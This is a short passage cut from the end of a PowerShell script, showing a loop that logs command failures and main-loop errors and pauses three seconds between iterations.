                            Write-Log -Message "Command failed: $command - $_" -Level "ERROR"
                        }
                    }
                }
            }
        }
        Start-Sleep -Seconds 3
    } catch {
        Write-Log -Message "Main loop error: $_" -Level "ERROR"
        Start-Sleep -Seconds 3
    }
}
